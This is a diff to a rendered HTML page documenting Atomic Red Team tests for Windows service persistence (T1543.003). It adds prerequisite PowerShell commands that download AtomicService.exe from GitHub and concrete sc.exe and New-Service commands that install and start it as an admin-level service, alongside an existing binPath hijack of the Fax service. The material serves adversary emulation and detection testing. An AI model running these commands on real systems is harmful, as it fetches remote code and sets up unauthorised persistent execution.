@@ -721,6 +721,34 @@
     </a>
     <ul class="nav section-nav flex-column">
      <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#dependencies-run-with-powershell">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#description-service-binary-must-exist-on-disk-at-specified-location-binary-path">
+         Description: Service binary must exist on disk at specified location (#{binary_path})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#check-prereq-commands">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#get-prereq-commands">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
+     <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#id1">
        Attack Commands: Run with
        <code class="docutils literal notranslate">
@@ -737,6 +765,34 @@
      Atomic Test #3 - Service Installation PowerShell
     </a>
     <ul class="nav section-nav flex-column">
+     <li class="toc-h4 nav-item toc-entry">
+      <a class="reference internal nav-link" href="#id2">
+       Dependencies:  Run with
+       <code class="docutils literal notranslate">
+        <span class="pre">
+         powershell
+        </span>
+       </code>
+       !
+      </a>
+      <ul class="nav section-nav flex-column">
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id3">
+         Description: Service binary must exist on disk at specified location (#{binary_path})
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id4">
+         Check Prereq Commands:
+        </a>
+       </li>
+       <li class="toc-h5 nav-item toc-entry">
+        <a class="reference internal nav-link" href="#id5">
+         Get Prereq Commands:
+        </a>
+       </li>
+      </ul>
+     </li>
      <li class="toc-h4 nav-item toc-entry">
       <a class="reference internal nav-link" href="#attack-commands-run-with-powershell">
        Attack Commands: Run with
@@ -787,7 +843,8 @@
 <p>This test will temporarily modify the service Fax by changing the binPath to PowerShell
 and will then revert the binPath change, restoring Fax to its original state.
 Upon successful execution, cmd will modify the binpath for <code class="docutils literal notranslate"><span class="pre">Fax</span></code> to spawn powershell. Powershell will then spawn.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
 <div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sc config Fax binPath= &quot;C:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -noexit -c \&quot;write-host &#39;T1543.003 Test&#39;\&quot;&quot;
@@ -807,11 +864,38 @@ sc start Fax
 <h3>Atomic Test #2 - Service Installation CMD<a class="headerlink" href="#atomic-test-2-service-installation-cmd" title="Permalink to this headline">¶</a></h3>
 <p>Download an executable from github and start it as a service.
 Upon successful execution, powershell will download <code class="docutils literal notranslate"><span class="pre">AtomicService.exe</span></code> from github. cmd.exe will spawn sc.exe which will create and start the service. Results will output via stdout.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="dependencies-run-with-powershell">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#dependencies-run-with-powershell" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="description-service-binary-must-exist-on-disk-at-specified-location-binary-path">
+<h5>Description: Service binary must exist on disk at specified location (#{binary_path})<a class="headerlink" href="#description-service-binary-must-exist-on-disk-at-specified-location-binary-path" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="check-prereq-commands">
+<h5>Check Prereq Commands:<a class="headerlink" href="#check-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1543</span><span class="p">.</span><span class="n">003</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AtomicService</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="get-prereq-commands">
+<h5>Get Prereq Commands:<a class="headerlink" href="#get-prereq-commands" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1543</span><span class="p">.</span><span class="n">003</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AtomicService</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1543.003\bin\AtomicService.exe&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1543</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">2</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sc.exe create #{service_name} binPath= #{binary_path}
-sc.exe start #{service_name}
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>sc.exe create AtomicTestService_CMD binPath= PathToAtomicsFolder\T1543.003\bin\AtomicService.exe
+sc.exe start AtomicTestService_CMD
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -827,11 +911,38 @@ sc.exe start #{service_name}
 <h3>Atomic Test #3 - Service Installation PowerShell<a class="headerlink" href="#atomic-test-3-service-installation-powershell" title="Permalink to this headline">¶</a></h3>
 <p>Installs A Local Service via PowerShell.
 Upon successful execution, powershell will download <code class="docutils literal notranslate"><span class="pre">AtomicService.exe</span></code> from github. Powershell will then use <code class="docutils literal notranslate"><span class="pre">New-Service</span></code> and <code class="docutils literal notranslate"><span class="pre">Start-Service</span></code> to start service. Results will be displayed.</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
+<div class="section" id="id2">
+<h4>Dependencies:  Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code>!<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h4>
+<div class="section" id="id3">
+<h5>Description: Service binary must exist on disk at specified location (#{binary_path})<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h5>
+</div>
+<div class="section" id="id4">
+<h5>Check Prereq Commands:<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nb">Test-Path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1543</span><span class="p">.</span><span class="n">003</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AtomicService</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="p">{</span><span class="n">exit</span> <span class="n">0</span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span><span class="n">exit</span> <span class="n">1</span><span class="p">}</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="id5">
+<h5>Get Prereq Commands:<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h5>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Item</span> <span class="n">-Type</span> <span class="n">Directory</span> <span class="p">(</span><span class="nb">split-path</span> <span class="n">PathToAtomicsFolder</span><span class="p">\</span><span class="n">T1543</span><span class="p">.</span><span class="n">003</span><span class="p">\</span><span class="n">bin</span><span class="p">\</span><span class="n">AtomicService</span><span class="p">.</span><span class="n">exe</span><span class="p">)</span> <span class="n">-ErrorAction</span> <span class="n">ignore</span> <span class="p">|</span> <span class="nb">Out-Null</span>
+<span class="nb">Invoke-WebRequest</span> <span class="s2">&quot;https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1543.003/bin/AtomicService.exe&quot;</span> <span class="n">-OutFile</span> <span class="s2">&quot;PathToAtomicsFolder\T1543.003\bin\AtomicService.exe&quot;</span>
+</pre></div>
+</div>
+<div class="cell docutils container">
+<div class="cell_input docutils container">
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Invoke</span><span class="o">-</span><span class="n">AtomicTest</span> <span class="n">T1543</span><span class="o">.</span><span class="mi">003</span> <span class="o">-</span><span class="n">TestNumbers</span> <span class="mi">3</span> <span class="o">-</span><span class="n">GetPreReqs</span>
+</pre></div>
+</div>
+</div>
+</div>
+</div>
+</div>
 <div class="section" id="attack-commands-run-with-powershell">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">powershell</span></code><a class="headerlink" href="#attack-commands-run-with-powershell" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Service</span> <span class="n">-Name</span> <span class="s2">&quot;#{service_name}&quot;</span> <span class="n">-BinaryPathName</span> <span class="s2">&quot;#{binary_path}&quot;</span>
-<span class="nb">Start-Service</span> <span class="n">-Name</span> <span class="s2">&quot;#{service_name}&quot;</span>
+<div class="highlight-powershell notranslate"><div class="highlight"><pre><span></span><span class="nb">New-Service</span> <span class="n">-Name</span> <span class="s2">&quot;AtomicTestService_PowerShell&quot;</span> <span class="n">-BinaryPathName</span> <span class="s2">&quot;PathToAtomicsFolder\T1543.003\bin\AtomicService.exe&quot;</span>
+<span class="nb">Start-Service</span> <span class="n">-Name</span> <span class="s2">&quot;AtomicTestService_PowerShell&quot;</span>
 </pre></div>
 </div>
 <div class="cell docutils container">
